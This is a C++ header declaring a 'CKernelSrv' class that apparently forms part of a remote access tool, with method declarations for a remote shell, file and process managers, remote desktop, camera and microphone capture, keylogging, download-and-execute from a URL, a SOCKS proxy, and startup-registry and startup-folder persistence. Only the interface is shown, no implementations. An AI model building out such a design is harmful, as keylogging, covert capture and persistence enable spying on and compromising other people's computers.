#pragma once
#include "kernel_common.h"
#include "EventHandler.h"




//Notify Message:
#define WM_KERNEL_LOGIN					(WM_USER + 401)
#define WM_KERNEL_LOGOUT				(WM_USER + 402)

#define WM_KERNEL_EDITGROUP				(WM_USER + 403)
#define WM_KERNEL_EDITCOMMENT			(WM_USER + 404)

#define WM_KERNEL_ERROR					(WM_USER + 405)
#define WM_KERNEL_UPDATE_UPLODA_STATU	(WM_USER + 406)

#define WM_KERNEL_GET_MODULE_PATH		(WM_USER + 407)


class CKernelSrv :
	public CEventHandler
{

private:
	char m_szPublicIP[0x100];

	//module transport.
	TCHAR	m_szModulePath[MAX_PATH];
	TCHAR	m_szCurrentModuleName[MAX_PATH];
	HANDLE	m_hModuleFile;
	UINT64  m_LastGetTime;
	BYTE *  m_lpBuffer;

	BOOL    m_bLogin;

	LoginInfo m_LoginInfo;

private:
 
	void OnClose() ;	
	void OnOpen();		

	void OnEvent(UINT32 e, BYTE *lpData, UINT32 Size);;

	void OnLogin(LoginInfo *pLi);

	CString getIPLocation(const CString & ip_address);

	void OnGetModuleInfo(const TCHAR*ModuleName);
	void OnGetModuleChunk(char * ChunkInfo);

public:
	CString GetLocation();
	CString GetPublicIP();

	LoginInfo* GetLoginInfo(){ return &m_LoginInfo; };

	void EditComment(TCHAR *Comment);
	void EditGroup(TCHAR * szGroup);

	void Power_Reboot();
	void Power_Shutdown();
	void Restart();

	void OnError(TCHAR * Error);

	void BeginCmd();
	void BeginChat();
	void BeginFileMgr();
	void BeginRemoteDesktop_gdi();
	void BeginRemoteDesktop_dxgi();
	void BeginCamera();
	void BeginMicrophone();
	void BeginDownloadAndExec(TCHAR szUrl[]);
	void BeginExit();
	void BeginKeyboardLog();
	void BeginProcessManager();
	void BeginProxy_Socks();
	void UtilsWriteStartupReg();
	void UtilsCopyToStartupMenu();
	void UtilsOpenWebpage(TCHAR * szUrl);


	//----------------------------------------------
	CKernelSrv(CClient *pClient);
	~CKernelSrv();
};

